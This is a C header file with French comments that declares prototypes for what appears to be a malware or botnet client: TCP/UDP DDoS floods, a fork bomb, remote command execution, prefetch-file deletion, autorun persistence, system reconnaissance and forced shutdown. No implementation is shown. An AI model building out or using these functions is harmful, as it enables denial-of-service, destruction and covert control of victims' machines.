#ifndef PROTO_H
#define PROTO_H

// Déclaration des prototypes des fonctions

int AutoRun();
//int dateconvert( FILETIME * valeur);
int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
const char *supfichier(char* filename);
const char* deletePrefetchFiles();
const char* forkbomb();
const char *testfunction();
const char *ftexec(char* command);
const char *image(char * filename);
const char *lock();
const char *logoff();
const char *randomize(const char *directoryPath);
const char *restart();
const char *shutdownfunc();
const char *song(char * filename);
char *GetSysInf();
char *enumfile(char* chemin);
const char* sysinfoall();
const char *afficherMessageBox(const char *titre, const char *texte, int numeroType);


#endif
